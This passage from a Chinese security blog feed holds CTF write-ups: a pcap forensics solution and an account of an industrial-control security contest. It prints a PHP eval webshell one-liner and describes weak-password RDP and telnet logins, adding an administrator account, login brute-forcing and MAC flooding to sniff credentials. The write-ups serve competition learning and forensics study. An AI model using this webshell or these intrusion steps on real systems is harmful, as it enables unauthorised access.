href="https://blog.csdn.net/windeal3203/article/details/51066331" target="_blank" rel="noopener">PPP协议</a>其中有这么一段描述</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535707113943.png" alt="1535707113943">随后，翻翻数据包，找到了最终的答案，分组序号<code>4953</code>中<code>192.168.94.59</code>向<code>192.168.32.131</code>发送了一个请求，内容如下，可以发现全部为<code>0.0.0.0</code></p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535707460046.png" alt="1535707460046"></p><p>紧接着分组序号<code>4954</code>返回了一个期望的值（即规定给的<code>vpn</code>的<code>ip</code>）</p><p><img src="/2018/08/31/一次网络流量分析引起的分析/1535707586841.png" alt="1535707586841"></p><p>再接下来的两个连续分组序号<code>4955</code>表示<code>192.168.94.59</code>再次询问能否以<code>192.168.94.59</code>刚刚发送的期望值，作为<code>192.168.94.59</code>的详细内容，分组序号<code>4956</code>表示接受这个请求。</p><p>此题到此分析完毕，最终答案就是<code>10.3.4.3</code>咯。</p><h4 id="一些看法"><a href="#一些看法" class="headerlink" title="一些看法"></a>一些看法</h4><p>之所以想谈谈这些看法，一是经常有人问流量分析有那么重要吗？每次分析出事情的真相又如何，都已经发生了，改变不了结果的；二是针对最近的某酒店用户信息重大泄露事件；</p><p>这个时代科技的风云聚变，我想每个人都有各自的感受，对于我而言，大一听到的网络安全，大二听到的人工智能，直到现在，以太坊、区块链等等。这些东西，之前不是没有，而是突然间变“火”了。对于网络安全而言，它的特点是革新的速度，这不单单是网络技术迅猛发展的护航需要，更是”道高一尺魔高一丈“的比拼。相对而言，网络流量的取证分析，好像都是”黑与白“之间较量后，才显露出的结果（这个结果往往是不好的）。其实不然，取证的目的就在于揭示那些”黑与白“较量之间的、有意义的、先前不为人知的、被人忽视的细节。网络取证看似亡羊补牢，但这又何尝不是还原每个事件真相的必要呢？只有知道那些真相的细节之处，才会促进网络安全的发展，提升网络安全的防护意识。</p><p>取证是一门艺术，“真的假不了，假的也真不了”。对于这些大大小小的安全事件而言，取证分析后，分析出造成不良结果的种种原因，或许让人觉得搞笑，亦或者震惊。但仔细想想，何尝不是给每个人敲响了警钟，让每个人多了点意识，每个团队学习了新的技术，每个“白帽子”心中的那份正义呢？</p><p>网络取证，流量分析，可能不是一项关于安全的技术，而是一项关于“不安全”的技术？你，觉得呢？</p><p>文章相关资料学习链接：</p><p><a href="https://www.cnblogs.com/virusolf/p/4335613.html" target="_blank" rel="noopener">对TCP重传的进一步认识</a>、 <a href="https://blog.csdn.net/mary19920410/article/details/72303641" target="_blank" rel="noopener">浅析GRE协议（通用路由封装协议）</a>、<a href="https://blog.csdn.net/eydwyz/article/details/54879808" target="_blank" rel="noopener">GRE、PPTP、L2TP隧道协议</a></p><p>本文由安全客原创发布<br>以上转载来自<code>安全客</code>：<a href="https://www.anquanke.com/post/id/158660" target="_blank" rel="noopener">一次网络流量分析引发的思考</a><br>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;闲来无事，做了做最近安恒&lt;code&gt;8&lt;/code&gt;月比赛的流量包，发现有些题目给的分析不够详细。本着学习知识的心态，重新梳理下思路，稍加扩展，再引申谈谈个人对网络流量取证方面的一些见解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>安恒八月月赛流量包writeup</title>
    <link href="https://jianghuxia.github.io/2018/08/26/%E5%AE%89%E6%81%92%E5%85%AB%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%8C%85writeup/"/>
    <id>https://jianghuxia.github.io/2018/08/26/安恒八月月赛流量包writeup/</id>
    <published>2018-08-26T11:36:31.000Z</published>
    <updated>2018-08-26T12:04:53.724Z</updated>
    
    <content type="html"><![CDATA[<p>安恒8月月赛多了个流量包分析，很好，铁三之后，很久没训练了，去玩玩呗。玩到比赛结束，不算很难，但说个实在话，分配的关卡有点不合理（给了两个vpn的包，只考一题，无语）。哦，对了，内附流量包下载链接。</p><a id="more"></a><p>先给个数据包下载地址：</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535270426213.png" alt="1535270426213"></p><h4 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h4><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535269950328.png" alt="1535269950328"></p><h4 id="总关卡"><a href="#总关卡" class="headerlink" title="总关卡"></a>总关卡</h4><ol><li><code>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器:</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可):</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码:</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么:</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少:</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么:</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号ijnu@test.com得到的密码是什么:edc123!@#</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip:</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username/password）:</code></li><li><code>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn,ip是多少:</code></li></ol><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><h5 id="1、黑客使用的扫描器：awvs"><a href="#1、黑客使用的扫描器：awvs" class="headerlink" title="1、黑客使用的扫描器：awvs"></a>1、黑客使用的扫描器：awvs</h5><p>这题猜的，之后分析了下，不难，也算是送分题，进去翻翻流量包，浏览一下就有了，很多下面这种格式</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535270767458.png" alt="1535270767458"></p><h5 id="2、黑客扫描到的登陆后台是（相对路径即可）：-admin-login-php-rec-login"><a href="#2、黑客扫描到的登陆后台是（相对路径即可）：-admin-login-php-rec-login" class="headerlink" title="2、黑客扫描到的登陆后台是（相对路径即可）：/admin/login.php?rec=login"></a>2、黑客扫描到的登陆后台是（相对路径即可）：/admin/login.php?rec=login</h5><p>这题，更是送分题，打开数据包，过滤下<code>http</code>，<code>86</code>分组请求的网站目录即是答案</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535271016370.png" alt="1535271016370"></p><h5 id="3、黑客使用了什么账号密码登陆了web后台（形式-username-password）：admin-admin-pass123"><a href="#3、黑客使用了什么账号密码登陆了web后台（形式-username-password）：admin-admin-pass123" class="headerlink" title="3、黑客使用了什么账号密码登陆了web后台（形式: username/password）：admin/admin!@#pass123"></a>3、黑客使用了什么账号密码登陆了web后台（形式: username/password）：admin/admin!@#pass123</h5><p>这里开始，就有点坑了，因为刚开始开头就有一个<code>302</code>的重定向包，看了下，好像也没错，的确也是登录成功了</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535271740511.png" alt="1535271740511"></p><p>后面发现，不止有黑客的<code>ip</code>，还有其他的<code>ip</code>。通过大量<code>404</code>请求，判断是黑客在扫目录，确认了下黑客<code>ip</code>为<code>192.168.94.59</code>，<code>http.response.code==302&amp;&amp;ip.addr==192.168.94.59</code>过滤下，发现<code>302</code>的包不是很多，标记一下，找下就好啦<img src="/2018/08/26/安恒八月月赛流量包writeup/1535272375077.png" alt="1535272375077">在最后一个<code>response.code</code>等于<code>302</code>的包找到了。所以，”人事”这个不是黑客登的，”<code>admin</code>“才是（大意了，果然，三个月没玩数据包生疏了）</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535272592573.png" alt="1535272592573"></p><h5 id="4、黑客上传的webshell文件名是，内容是什么-提交webshell内容的base编码：PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs-Pg"><a href="#4、黑客上传的webshell文件名是，内容是什么-提交webshell内容的base编码：PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs-Pg" class="headerlink" title="4、黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码：PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs/Pg=="></a>4、黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码：PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs/Pg==</h5><p>这题，贼鸡儿坑。这题是放到最后才蒙出来的。浏览<code>webone.pcap</code>数据包的末尾，发现<code>a.php</code>有猫咪，但是死活找不到它是如何上传的，最后，无可奈何，既然有<code>1234</code>为传递值，构造了个一句话木马：&lt;?php @eval($_POST[1234]);?&gt; ，然后提交<code>base64</code>编码，过了！过了！……..</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535272925397.png" alt="1535272925397"></p><p>赛后仔细找了找，找到了 ，但是非常奇怪，为什么这个出现在<code>tcp</code>流里面，我在<code>http</code>流里面压根没找到这个<code>html</code>，过滤语句<code>tcp contains &quot;&lt;?php @eval&quot;</code>（如果以后<code>http</code>不行，那就试试<code>tcp</code>，可能是<code>tcp</code>重传的原因，导致<code>http</code>中没追踪到）</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535282630426.png" alt="1535282630426"></p><p>下面是手动筛选<code>tcp</code>流的方式</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535275180645.png" alt="1535275180645"></p><h5 id="5、黑客在robots-txt中找到的flag是什么：87b7cb79481f317bde90c116cf36084b"><a href="#5、黑客在robots-txt中找到的flag是什么：87b7cb79481f317bde90c116cf36084b" class="headerlink" title="5、黑客在robots.txt中找到的flag是什么：87b7cb79481f317bde90c116cf36084b"></a>5、黑客在robots.txt中找到的flag是什么：87b7cb79481f317bde90c116cf36084b</h5><p>浏览<code>webone.pcap</code>数据包的末尾，查看众多<code>a.php</code>的执行命令的响应即可找到答案。</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535166614685.png" alt="1535166614685"></p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535166653144.png" alt="1535166653144"></p><h5 id="6、黑客找到的数据库密码是多少：e667jUPvJjXHvEUv"><a href="#6、黑客找到的数据库密码是多少：e667jUPvJjXHvEUv" class="headerlink" title="6、黑客找到的数据库密码是多少：e667jUPvJjXHvEUv"></a>6、黑客找到的数据库密码是多少：e667jUPvJjXHvEUv</h5><p>依旧浏览<code>webone.pcap</code>数据包的末尾，查看下响应的包，即可找到答案</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535276945723.png" alt="1535276945723"></p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535166858893.png" alt="1535166858893"></p><h5 id="7、黑客在数据库中找到的hash-code是什么：d1c029893df40cb0f47bcf8f1c3c17ac"><a href="#7、黑客在数据库中找到的hash-code是什么：d1c029893df40cb0f47bcf8f1c3c17ac" class="headerlink" title="7、黑客在数据库中找到的hash_code是什么：d1c029893df40cb0f47bcf8f1c3c17ac"></a>7、黑客在数据库中找到的hash_code是什么：d1c029893df40cb0f47bcf8f1c3c17ac</h5><p>接着打开<code>webtwo.pcap</code>数据包，查看下前面几个<code>mysql</code>请求和响应，即可找到答案</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535162265285.png" alt="1535162265285"></p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535162305942.png" alt="1535162305942"></p><h5 id="8、-黑客破解了账号ijnu-test-com得到的密码是什么：edc123"><a href="#8、-黑客破解了账号ijnu-test-com得到的密码是什么：edc123" class="headerlink" title="8、:黑客破解了账号ijnu@test.com得到的密码是什么：edc123!@"></a>8、:黑客破解了账号<a href="mailto:ijnu@test.com" target="_blank" rel="noopener">ijnu@test.com</a>得到的密码是什么：edc123!@</h5><p>这里有了点小技巧，直接将这个邮箱化为相应的字符串<code>16</code>进制值，直接查找</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535163233365.png" alt="1535163233365"></p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535163224381.png" alt="1535163224381"></p><p>然后MD5解密下，得到答案</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535163810679.png" alt="1535163810679"></p><h5 id="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip：10-3-3-100"><a href="#9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip：10-3-3-100" class="headerlink" title="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip：10.3.3.100"></a>9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip：10.3.3.100</h5><p>这里有回到了<code>webone.pcap</code>数据包，依旧浏览<code>webone.pcap</code>数据包的末尾，查看下响应的包，即可找到答案</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535167066024.png" alt="1535167066024"></p><h5 id="10、黑客使用了什么账号登陆了mail系统（形式-username-password）：admin-admin-pass123"><a href="#10、黑客使用了什么账号登陆了mail系统（形式-username-password）：admin-admin-pass123" class="headerlink" title="10、黑客使用了什么账号登陆了mail系统（形式: username/password）：admin/admin!@#pass123"></a>10、黑客使用了什么账号登陆了mail系统（形式: username/password）：admin/admin!@#pass123</h5><p>这题需要看<code>mailtwo.pcap</code>和<code>mailtwo1.pcap</code>两个数据包。</p><p>首先在<code>mailtwo.pcap</code>中过滤<code>http</code>，序号<code>3</code>的<code>Cookie</code>中就发现 <code>login_name=wenwenni</code>字段，并且是<code>action=logout</code>。<img src="/2018/08/26/安恒八月月赛流量包writeup/1535267557510.png" alt="1535267557510"></p><p>继续跟进，发现下一个序号是<code>28</code>分组，又到了登陆界面的<code>35</code>分组，在其中发现了密码的加密函数：</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535268095509.png" alt="1535268095509"></p><p>取出来发现是<code>AES</code>的<code>CBC</code>加密，填充格式为<code>ZeroPadding</code>，密钥为字符串<code>1234567812345678</code>的<code>hash</code>值，偏移量为<code>1234567812345678</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(key_hash);</span><br><span class="line"><span class="keyword">var</span> iv  = CryptoJS.enc.Utf8.parse(<span class="string">'1234567812345678'</span>);</span><br><span class="line"> form.password.value = CryptoJS.AES.encrypt(form.password.value, key, &#123; <span class="attr">iv</span>: iv,<span class="attr">mode</span>:CryptoJS.mode.CBC,<span class="attr">padding</span>:CryptoJS.pad.ZeroPadding&#125;);</span><br></pre></td></tr></table></figure><p>因刚退出，所以是根据<code>cookie</code>中的信息登陆的，在下一请求<code>42</code>分组对应的<code>45</code>分组中出现<code>{&quot;success&quot;:true}</code>，表示登陆成功。</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535268433463.png" alt="1535268433463"></p><p>既然如此，我们使用<code>(http contains &quot;{\&quot;success\&quot;:true}&quot; or http.request.method==&quot;POST&quot;) and ip.addr==192.168.94.59</code>过滤一下，显示出<code>post</code>请求及成功的返回结果，l浏览一下发现是在爆破，并且到<code>mailtwo.pcap</code>的最后也未爆破成功。相同的过滤条件上在<code>mailtwo1.pcap</code>上试试，发现几条数据，从后往前看，发现<code>18152</code>是登陆成功的返回结果，那对应的<code>17126</code>则就是正确的加密后的密码。</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535269130976.png" alt="1535269130976"></p><p>那么<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">解密网址</a>进行<code>aes</code>解密即可得到<code>admin</code>账号的密码。此题最终答案即为：<code>admin/admin!@#PASS123</code></p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535267206637.png" alt="1535267206637"></p><p>此题，据说还有一种方法：社工。但是个人认为并不合理，此题答案跟第三题答案碰巧一样罢了，因为两个关卡的源服务器<code>ip</code>并不一样。</p><h5 id="11、黑客获得的vpn-ip是多少：10-3-4-3"><a href="#11、黑客获得的vpn-ip是多少：10-3-4-3" class="headerlink" title="11、黑客获得的vpn,ip是多少：10.3.4.3"></a>11、黑客获得的vpn,ip是多少：10.3.4.3</h5><p>这题其实只需要<code>vpn</code>的第一个包就行了，百度学习一波<code>vpn</code>包相关协议，收益匪浅（吐槽下，安恒的直播课真的需要讲点干货，别为了解题而解题啊，让人家直接去一个一个试内网的<code>ip</code>，这不是很好吧）</p><p><img src="/2018/08/26/安恒八月月赛流量包writeup/1535178357297.png" alt="1535178357297"></p><p>这里留两个链接供参考学习：</p><p><a href="https://www.baidu.com/link?url=QVvirQIPDHeCtUdC5_WC7hvjfnA2B3osyBn19gYG1nPWz3dkI1d0t493kbK0PAcA&amp;wd=&amp;eqid=e2d03cd9000225ee000000065b827dae" target="_blank" rel="noopener">探究<em>vpn数据包</em>传输过程</a></p><p><a href="https://www.baidu.com/link?url=F-oAhsOYdXkfQKF2AhaabmiAtz9m1XZM_R1a5H0f81SmBQ83bf-VWGQyAz3OAEE19PlkJHjU7DTLDtXEnOa0NuTDaKp_gpw6_ltcSucvJKy&amp;wd=&amp;eqid=9398983a0002bc91000000065b827e1a" target="_blank" rel="noopener">PPTP 理解以及报文的<em>分析</em></a></p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>数据包分析还是很有意思的，个人计划着来一波数据协议的实验分析，可能会有点复杂，但是其中的乐趣也是无穷，有兴趣的小伙伴请联系我，一起学习！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安恒8月月赛多了个流量包分析，很好，铁三之后，很久没训练了，去玩玩呗。玩到比赛结束，不算很难，但说个实在话，分配的关卡有点不合理（给了两个vpn的包，只考一题，无语）。哦，对了，内附流量包下载链接。&lt;/p&gt;
    
    </summary>
    
    
      <category term="数据包分析" scheme="https://jianghuxia.github.io/tags/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>福建省gk安全大赛writeup</title>
    <link href="https://jianghuxia.github.io/2018/08/25/%E7%A6%8F%E5%BB%BA%E7%9C%81gk%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwriteup/"/>
    <id>https://jianghuxia.github.io/2018/08/25/福建省gk安全大赛writeup/</id>
    <published>2018-08-25T13:34:16.000Z</published>
    <updated>2018-08-26T12:01:00.147Z</updated>
    
    <content type="html"><![CDATA[<p>有幸参加了某省首届工控安全大赛，学到了很多，发现了一些作为<code>web</code>狗的底层缺陷，谈谈此次比赛的体验。</p><a id="more"></a> <h3 id="预赛"><a href="#预赛" class="headerlink" title="预赛"></a>预赛</h3><h4 id="题目详情"><a href="#题目详情" class="headerlink" title="题目详情"></a>题目详情</h4><p>刚开始我们前方屏幕显示如下，是一个工业控制的模拟图</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/004.png" alt="004"></p><p>可以发现，模拟了一些工业、小区居住区的地区图。<code>PLC</code>，菜鸡我是这样理解的，首先<code>web</code>安全和工控安全，开始前期的信息收集、渗透测试都是差不多的：外网攻击，渗透内网，提权等等。最大的不同在于工控安全还跟PLC相结合，这意味着什么？一个工业的控制系统，交由某台主机控制，包括控制所有机器的操作控制，一旦紧急情况发生，重启这台主机是不行的，因为往往会造成巨大的经济损失，甚至危害到群众的生命危险，更甚者，引发灾难（震网事件、乌克兰电厂停电事件）</p><h4 id="比赛非预期解法"><a href="#比赛非预期解法" class="headerlink" title="比赛非预期解法"></a>比赛非预期解法</h4><p>刚开始我们的电脑只连接了路由器设备，主办方没有给任何<code>ip</code>提示。</p><p>尝试查看<code>ip</code>，发现是<code>169.254.xx.xx</code>的静态<code>ip</code></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535040344678.png" alt="1535040344678"></p><p>抓个包玩玩，发现<code>192.168.10.11</code></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/008.png" alt="008"></p><p>IPV4协议IP改为<code>192.168.10.11</code>，子网掩码<code>255.255.255.0</code>，发现<code>ip</code>还是静态<code>ip</code>（这里估计<code>DHCP</code>服务器关掉了，只能靠抓包分析了）</p><p>难道思路错了？<code>nmap</code>扫扫试试。</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/0011.png" alt="0011"></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/0012.png" alt="0012"></p><p>扫到两个<code>192.168.10.11</code>和<code>192.168.10.111</code>，那么应该是ip冲突了，后面ip手动改成<code>192.168.10.x</code>，<code>x</code>表示任意数字，这里取<code>10</code>，改正为<code>192.168.10.10</code></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535040600687.png" alt="1535040600687"></p><p>然后再<code>ipconfig</code>，ok，成功了</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535040323330.png" alt="1535040323330"></p><p>成功获取<code>ip</code>后，可以发现，上面<code>nmap</code>扫端口时，<code>192.168.10.11</code>开放的端口贼多，我们尝试了去访问<code>80</code>端口，并没有发现<code>http</code>服务。后面，队友提示了<code>135</code>、<code>139</code>、<code>445</code>这些端口，我们准备用<code>kali</code>的<code>msf</code>“永恒之蓝”攻击，突然队友又说了句，试试<code>3389</code>，然后远程登录试试，我们用户名用<code>Administrator</code>，密码第一次尝试”<code>000000</code>“、第二次尝试”<code>123456</code>“、第三次尝试”<code>admin</code>“、…… 。发现无果，准备关掉去试永恒之蓝，随意输了”<code>admin123</code>“，结果弹出个登录成功的运行界面，卧槽，我和我的小伙伴都惊呆了，然后按照题目第三关的要求，直接添加了一个队伍名的账号，直接拿了一血，我滴个天啊。</p><p>其实，当我们手动改<code>ip</code>成功后，通过路由表，也是可以发现<code>C</code>段内的其余主机<code>ip</code></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535042196717.png" alt="1535042196717"></p><h4 id="比赛预期解法"><a href="#比赛预期解法" class="headerlink" title="比赛预期解法"></a>比赛预期解法</h4><p>其实这也不算是非预期解法，安全本就于此，任何漏洞都可能会被利用，不管漏洞利用的可能性是否高低，只要被利用，都是“好”漏洞。后面学习了下，问了下一些大佬，其实预期做法是通过<code>mac</code>地址泛洪攻击开始第一关，利用交换机的<code>mac</code>地址学习机制，不断的进行<code>mac</code>地址刷新，迅速填满交换机的<code>mac</code>地址表，以至崩溃，使交换机不得不使用广播发包，从而获取其他人的报文信息。而其中，我们需要获得的是<code>ftp</code>的账号和密码，通过上诉攻击方法，尝试登陆<code>ftp</code>，同时抓包会得到正确的<code>ftp</code>账号和密码，登陆后，取得题目第二关所要寻找的<code>test</code>文件。</p><h3 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h3><h4 id="题目详情-1"><a href="#题目详情-1" class="headerlink" title="题目详情"></a>题目详情</h4><p>与昨日的预赛规则相比，最大的不同就是多了个内网的防火墙，以下为比赛的关卡：</p><ol><li>要求获取主机<code>SCADA</code>系统的管理员的权限</li><li>获取<code>SCADA</code>系统的敏感信息文件</li><li>造成<code>SCADA</code>系统与靶机系统拒绝服务</li><li>修改<code>SCADA</code>系统监控状态</li><li>修改靶机系统逻辑</li><li>攻坚保卫战</li></ol><p>一共<code>6</code>个关卡，提供了一条网线。</p><h4 id="比赛解法"><a href="#比赛解法" class="headerlink" title="比赛解法"></a>比赛解法</h4><p>比赛开始后，接入网线，抓包看看流量的流向，发现毫无踪迹，不像昨天的预赛，可以发现特殊的局域网<code>ip</code>走向。</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535089134307.png" alt="1535089134307"></p><p>那咋办，想起昨天的比赛ip分配机制，网段即是按照队伍比赛序号分配的，于是，我们先直接<code>nmap</code>扫<code>192.168.0.0/16</code>，发现存在<code>ip：192.168.2.217</code>，想到昨天预赛的ip冲突，保险点，我们直接手动将ip改为<code>192.168.2.x</code>，<code>x</code>为任意值，我们这里取的是<code>218</code>，观察流量包入下，<code>ipconfig</code>命令也发现ip变为<code>192.168.2.218</code></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535089397191.png" alt="1535089397191"></p><p>当然，此时我们还不能确定网段，<code>nmap</code>再扫一下，看看同网段有没有其他的<code>ip</code>地址</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535089616964.png" alt="1535089616964"></p><p>nice!证明我们的判断是没错的，还发现了<code>192.168.2.202</code>开放的端口，看到<code>23</code>，想到了<code>telnet</code>。虚拟机<code>kali</code>尝试<code>telnet</code>登陆<code>192.168.2.202</code>,发现需要账号和密码。（<code>windows10</code>系统默认<code>telnet</code>服务没开，后面的<code>telnet</code>服务都是通过虚拟机进行的）</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535090020376.png" alt="1535090020376"></p><p>那么再<code>namp</code>下这个<code>ip</code></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535089809260.png" alt="1535089809260"></p><p>可以看到主机名为<code>MM-PC</code>，尝试弱密码登陆无果。</p><p>这里有个清况，当我们以为取<code>ip</code>为<code>192.168.2.218</code>，是为了不与<code>192.168.2.217</code>冲突，但是正是这个决定，让我们搞不清楚网段中存在哪些机器。因为刚开始，我们没像预赛开始一样通过抓包找到属于网段中的数据流向，这就意味着存在网段中存在着防火墙。如果<code>192.168.2.202</code>是<code>SCADA</code>的<code>IP</code>，难道<code>192.168.2.217</code>是防火墙的IP？我们尝试去<code>ping</code>下试试（此时<code>ip</code>为<code>192.168.2.218</code>），不出所料，<code>ping</code>不通<code>192.168.2.217</code>？(防火墙一般是禁ping的，但是为了防止意味，我们后面还是手动将ip尝试改为<code>192.168.2.217</code>，按照常理，如果防火墙的ip为<code>192.168.2.217</code>，那么此时会有<code>ip</code>冲突，但是不可思议的事情发生了。并没有像想象中的一样会出现ip冲突，<code>ipconfig /renew</code>，得到的<code>ip</code>结果为<code>192.168.2.217</code>，这意味着，不存在<code>ip</code>冲突。再尝试了下，<code>ping 192.168.2.217</code>,发现竟然<code>ping</code>通了。此时我们猜想，是否是路由器分配了一个空的<code>ip</code>地址给我们的主机，而这个地址就是<code>192.168.2.217</code>。随后我们再次进行<code>nmap</code>，卧槽，竟然多了一个<code>192.168.2.2</code>这个新的ip，<code>nmap</code>再扫下<code>192.168.2.2</code>，发现没有开放任何服务（这里的比赛截图因为操作失误，没有成功截取）</p><p>所以这个时候，我们才真正意识到我们之前的思路错了，正确的划分，应该是，<code>192.168.2.217</code>是路由器划分给我们的<code>ip</code>，<code>192.168.2.202</code>是<code>SCADA</code>服务器的<code>ip</code>，<code>192.168.2.2</code>是防火墙<code>ip</code>。</p><p>比赛进行到这，我们按照这个正确的想法尝试了许久，发现<code>192.168.2.202</code>开放的服务只有telnet（<code>445</code>，<code>135</code>，<code>139</code>都开着，那时候还想打一波永恒之蓝）。于是我们开始手动爆破telnet的登陆用户名和密码，经过十几分钟的尝试，用户名：<code>MM</code>，密码：<code>666666</code>（这里直觉就是跟初赛差不多的弱密码，没想到最后是六个六）<img src="/2018/08/25/福建省gk安全大赛writeup/1535199971916.png" alt="1535199971916"></p><p><code>nice！</code>但是由于之前的学习原因，没有运用过<code>telnet</code>协议，不知道怎么登，再加上<code>win10</code>跟旧版<code>windows</code>系统的操作差别，导致我们不知道该怎么利用，后面浪费了一点时间，才去开启<code>windows sever2003</code>的虚拟机试水。</p><p><code>windows sever2003</code>配置<code>ip</code>为<code>192.168.2.66</code>，改为桥接模式。手动配置成功后，进行下述操作：</p><p>查看网络资源管理界面</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535200338540.png" alt="1535200338540"></p><p>命令行方式下，登陆<code>MM-PC</code></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535200429704.png" alt="1535200429704"></p><p>登陆成功后，查看当前<code>SCADA</code>服务器的<code>ip</code></p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535200725087.png" alt="1535200725087"></p><p>查看当前路由表</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535200767742.png" alt="1535200767742"></p><p>查看当前主机系统信息</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535201061773.png" alt="1535201061773"></p><p>随后我们添加了属于自己队伍名的用户<code>net localgroup administrators haha 000000 /add</code>，提权操作<code>net localgroup administrators haha /add</code>，至此我们成功的完成了第一关。</p><p>随后，我们按照第二关的要求，查看桌面内容，发现了密函文件，其实是个Rar压缩包文件，伪装成了txt</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535201161436.png" alt="1535201161436"></p><p>然而尴尬的事情发生了，虚拟机<code>windows sever2003</code>不知道如何开启远程桌面，而物理机<code>win10</code>,在无法外网查找资料下，不知如何开启，导致通过命令行<code>telnet</code>的操作只能了解到这么多的信息。后面还查看了下<code>C</code>盘目录</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535201482705.png" alt="1535201482705"></p><p>后面估计需要一句话写入执行开启<code>3389</code>远程端口，然后通过远程操作，进行后面的关卡操作。</p><p>或者正如下图所说</p><p><img src="/2018/08/25/福建省gk安全大赛writeup/1535201668658.png" alt="1535201668658"></p><p>太菜了，打不动，<code>plc</code>层面的东西都没接触到。。。</p><h3 id="总结"><a href="#总结" class="headerlink" 